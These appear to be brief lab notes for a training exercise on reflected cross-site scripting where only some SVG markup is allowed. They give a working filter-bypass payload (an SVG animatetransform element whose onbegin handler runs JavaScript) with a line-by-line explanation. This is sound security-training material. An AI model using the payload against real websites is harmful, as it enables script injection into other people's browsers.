---
title: "16 - Reflected XSS with some SVG markup allowed"
---

# 16 - Reflected XSS with some SVG markup allowed

https://www.youtube.com/watch?v=7dKk4A6viWo

```html
<svg>
<animatetransform onbegin=alert(1) attributeName=transform>
</svg>
```
### Explanation:
- `<svg>`: The SVG container.
- `<animatetransform>`: An SVG element that allows for animations on transformations like `rotate`, `scale`, etc.
- `onbegin=alert(1)`: This triggers a JavaScript `alert(1)` when the animation begins.
- `attributeName=transform`: Specifies the attribute to animate.
